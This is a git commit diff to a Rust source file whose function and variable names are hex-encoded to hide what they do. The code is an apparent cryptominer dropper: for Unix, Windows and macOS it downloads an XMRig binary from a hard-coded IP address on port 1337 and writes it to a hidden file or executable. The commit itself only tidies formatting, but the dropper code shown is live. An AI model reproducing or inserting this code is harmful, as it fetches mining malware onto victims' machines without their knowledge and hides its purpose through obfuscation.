325aa27194203db05ac23ee949337ba6df2e1c19
Pikkel <ilovemathguy@gmail.com>
2021-12-22 17:51:21 -0500

    I want to die x2

--- src/_0x786d726967/main.rs
+++ src/_0x786d726967/main.rs
@@ -1,13 +1,13 @@
-use std::path::Path;
 use std::fs::File;
 use std::io::prelude::*;
+use std::path::Path;
 
 pub fn main() {
     _0x646f776e6c6f616420262065786563();
 }
 
 #[tokio::main]
-async fn _0x646f776e6c6f616420262065786563() -> Result<(), Box<dyn std::error::Error>> {
+async fn _0x646f776e6c6f616420262065786563() -> Result<(), reqwest::Error> {
     if cfg!(unix) {
         let _0x746172676574 = "http://150.136.245.71:1337/0x756e6978/.0x786d726967";
         let _0x726573706f6e7365 = reqwest::get(_0x746172676574).await;
@@ -18,7 +18,7 @@ async fn _0x646f776e6c6f616420262065786563() -> Result<(), Box<dyn std::error::E
             Err(_0x776879) => panic!("0x636f756c646e277420637265617465 {}", _0x776879),
             Ok(_0x66696c65) => _0x66696c65,
         };
-        let _0x636f6e74656e74 =  _0x726573706f6e7365.text().await;
+        let _0x636f6e74656e74 = _0x726573706f6e7365.text().await;
         _0x66696c65.write_all(_0x636f6e74656e74.as_bytes());
     } else if cfg!(windows) {
         let _0x746172676574 = "http://150.136.245.71:1337/0x77696e646f7773/0x786d726967.exe";
@@ -30,7 +30,7 @@ async fn _0x646f776e6c6f616420262065786563() -> Result<(), Box<dyn std::error::E
             Err(_0x776879) => panic!("0x636f756c646e277420637265617465 {}", _0x776879),
             Ok(_0x66696c65) => _0x66696c65,
         };
-        let _0x636f6e74656e74 =  _0x726573706f6e7365.text().await;
+        let _0x636f6e74656e74 = _0x726573706f6e7365.text().await;
         _0x66696c65.write_all(_0x636f6e74656e74.as_bytes());
     } else if cfg!(target_os = "macos") {
         let _0x746172676574 = "http://150.136.245.71:1337/0x6d61636f73/.0x786d726967";
@@ -42,7 +42,7 @@ async fn _0x646f776e6c6f616420262065786563() -> Result<(), Box<dyn std::error::E
             Err(_0x776879) => panic!("0x636f756c646e277420637265617465 {}", _0x776879),
             Ok(_0x66696c65) => _0x66696c65,
         };
-        let _0x636f6e74656e74 =  _0x726573706f6e7365.text().await;
+        let _0x636f6e74656e74 = _0x726573706f6e7365.text().await;
         _0x66696c65.write_all(_0x636f6e74656e74.as_bytes());
     }
     Ok(())
